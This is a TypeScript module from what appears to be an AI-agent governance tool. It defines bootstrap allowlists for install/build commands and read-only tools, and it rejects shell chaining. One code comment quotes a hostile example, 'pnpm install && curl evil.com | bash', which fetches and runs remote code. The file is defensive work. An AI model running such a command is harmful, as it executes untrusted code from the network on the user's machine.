// Bootstrap detection for AgentGuard governance hooks (AgentGuardHQ/agentguard#995).
//
// When the kernel packages haven't been built yet, dynamic imports will fail.
// Instead of blocking all actions (Claude) or silently disabling governance
// (Copilot/Codex/Gemini), detect bootstrap mode and allow install/build
// commands and read-only tools through.
//
// This module is the single source of truth for bootstrap allowlists.
// Shell wrappers in templates/scripts.ts generate their patterns from these constants.

/**
 * Commands that are safe to allow through during bootstrap (before the kernel is built).
 * These are the minimum commands needed to install dependencies and build the project.
 */
export const BOOTSTRAP_SAFE_COMMANDS = [
  'pnpm install',
  'pnpm i',
  'npm install',
  'npm ci',
  'npm i',
  'yarn install',
  'yarn',
  'pnpm build',
  'npm run build',
  'yarn build',
  'npx turbo build',
  'pnpm turbo build',
];

/**
 * Read-only tools that are safe to allow during bootstrap.
 * These cannot mutate state.
 */
export const BOOTSTRAP_SAFE_TOOLS = new Set([
  'Read',
  'Glob',
  'Grep',
  'LS',
  'NotebookRead',
  'WebSearch',
  'WebFetch',
]);

/**
 * Extract the first command from a potentially chained command string.
 * Splits on shell operators (&&, ||, ;, |) and returns only the first segment.
 */
export function extractFirstCommand(command: string): string {
  return command.split(/\s*(?:&&|\|\||[;|`])\s*/)[0].trim();
}

/**
 * Check if a command string contains shell chaining operators.
 * Returns true if the command chains multiple operations (&&, ||, ;, |, backtick).
 *
 * This prevents bypasses like: "pnpm install && curl evil.com | bash"
 */
export function containsChainingOperators(command: string): boolean {
  return /&&|\|\||[;`]|\|(?!\|)/.test(command);
}

/**
 * Extract the Bash command from a hook payload, normalizing across driver formats.
 *
 * - Claude Code: { tool_input: { command: "..." } }
 * - Copilot/Codex: { toolArgs: '{"command":"..."}' } (JSON string)
 * - Gemini: { tool_input: { command: "..." } }
 */
function extractCommand(data: Record<string, unknown>): string | undefined {
  // Claude / Gemini: tool_input is an object with .command
  const toolInput = data.tool_input as Record<string, unknown> | undefined;
  if (toolInput && typeof toolInput.command === 'string') {
    return toolInput.command.trim();
  }

  // Copilot / Codex: toolArgs is a JSON string
  const toolArgs = data.toolArgs as string | undefined;
  if (toolArgs) {
    try {
      const parsed = JSON.parse(toolArgs) as Record<string, unknown>;
      if (typeof parsed.command === 'string') return parsed.command.trim();
    } catch {
      // toolArgs parse failure — not a Bash command
    }
  }

  return undefined;
}

/**
 * Check if a hook payload represents a bootstrap-safe action.
 * Works across all driver payload formats (Claude, Copilot, Codex, Gemini).
 *
 * Returns true if the action should be allowed through without kernel evaluation.
 */
export function isBootstrapSafeAction(data: Record<string, unknown>): boolean {
  // Normalize tool name across drivers: Claude uses tool_name, others use toolName
  const toolName = (data.tool_name ?? data.toolName) as string | undefined;
  if (!toolName) return false;

  // Read-only tools are always safe
  if (BOOTSTRAP_SAFE_TOOLS.has(toolName)) return true;

  // Bash commands: check the command is a pure bootstrap command with no chaining
  if (toolName === 'Bash') {
    const command = extractCommand(data);
    if (!command) return false;

    // SECURITY: reject any command with chaining operators (&&, ||, ;, |, backtick).
    // A legitimate "pnpm install --frozen-lockfile" won't chain other commands.
    if (containsChainingOperators(command)) return false;

    return BOOTSTRAP_SAFE_COMMANDS.some(
      (safe) =>
        command === safe || command.startsWith(safe + ' ') || command.startsWith(safe + '\t')
    );
  }

  return false;
}

/**
 * Check if an error is a module-not-found error (kernel not built).
 */
export function isModuleNotFoundError(err: unknown): boolean {
  const msg = err instanceof Error ? err.message : String(err);
  return (
    msg.includes('Cannot find module') ||
    msg.includes('ERR_MODULE_NOT_FOUND') ||
    msg.includes('ENOENT')
  );
}
